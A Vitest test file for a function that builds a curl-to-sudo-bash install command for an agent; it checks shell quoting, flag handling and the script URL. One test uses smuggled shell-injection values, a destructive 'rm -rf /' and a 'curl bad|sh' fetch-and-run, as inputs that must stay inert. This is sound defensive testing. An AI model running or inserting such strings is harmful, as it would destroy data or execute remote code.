import { describe, expect, it } from "vitest";
import { buildInstallCommand } from "./install-command";

describe("buildInstallCommand", () => {
  it("quotes every interpolated value", () => {
    const cmd = buildInstallCommand(
      "https://panel.example.com",
      "tok-123",
      "edge-east-01",
    );
    expect(cmd).toContain("--panel-url 'https://panel.example.com'");
    expect(cmd).toContain("--token 'tok-123'");
    expect(cmd).toContain("--node-name 'edge-east-01'");
  });

  it("neutralizes shell metachars in token and node name", () => {
    // The wizard pre-validates nodeName via isValidNodeName, but the
    // build function still has to be safe in isolation: token comes
    // straight from the backend and could in theory contain quirky
    // bytes; defense-in-depth.
    const cmd = buildInstallCommand(
      "https://panel.example.com",
      "tok'; rm -rf / #",
      "x;curl bad|sh",
    );
    // Single-quoted: nothing inside expands or breaks the argv slot.
    expect(cmd).toContain(String.raw`--token 'tok'\''; rm -rf / #'`);
    expect(cmd).toContain("--node-name 'x;curl bad|sh'");
    // No bare semicolon escapes the quoting.
    expect(cmd).not.toMatch(/--token tok'; rm/);
  });

  it("omits advanced flags when values match defaults", () => {
    const cmd = buildInstallCommand("https://p", "tok", "node", {
      telemtUrl: "http://127.0.0.1:9091",
      telemtMetricsUrl: "http://127.0.0.1:8081",
      telemtAuth: "",
      insecureTransport: false,
    });
    expect(cmd).not.toContain("--telemt-url");
    expect(cmd).not.toContain("--telemt-metrics-url");
    expect(cmd).not.toContain("--telemt-auth");
    expect(cmd).not.toContain("--insecure-transport");
  });

  it("appends and quotes advanced flags when overridden", () => {
    const cmd = buildInstallCommand("https://p", "tok", "node", {
      telemtUrl: "http://10.0.0.5:9091",
      telemtMetricsUrl: "http://10.0.0.5:8081",
      telemtAuth: "user:p@ss'word",
      insecureTransport: true,
    });
    expect(cmd).toContain("--telemt-url 'http://10.0.0.5:9091'");
    expect(cmd).toContain("--telemt-metrics-url 'http://10.0.0.5:8081'");
    // Single quote in the auth string survives the round-trip.
    expect(cmd).toContain(String.raw`--telemt-auth 'user:p@ss'\''word'`);
    expect(cmd).toContain("--insecure-transport");
  });

  // PR-3a / PR-3c: scriptUrl parametrisation. The verified-form
  // experiment was removed in PR-3c (the multi-line shell snippet
  // looked like a script source, not a "paste this" affordance);
  // the wizard always emits the plain curl|sudo-bash form, and
  // operators who want SHA-256 verification do it manually using
  // the digest surfaced separately by the rendering component.

  it("defaults to the upstream GitHub-raw URL when scriptUrl is omitted", () => {
    const cmd = buildInstallCommand("https://p", "tok", "node");
    expect(cmd).toContain(
      "curl -fsSL https://raw.githubusercontent.com/lost-coder/panvex/main/deploy/install-agent.sh",
    );
  });

  it("honours a custom scriptUrl (Panel source)", () => {
    const cmd = buildInstallCommand(
      "https://panel.example.com",
      "tok",
      "node",
      undefined,
      "https://panel.example.com/install-agent.sh",
    );
    expect(cmd).toContain(
      "curl -fsSL https://panel.example.com/install-agent.sh | \\\n  sudo bash -s --",
    );
    // Never the multi-line verified form regardless of source.
    expect(cmd).not.toContain("mktemp");
    expect(cmd).not.toContain("sha256sum");
    expect(cmd).not.toContain("PANVEX_INSTALL_SCRIPT_SHA256");
  });
});
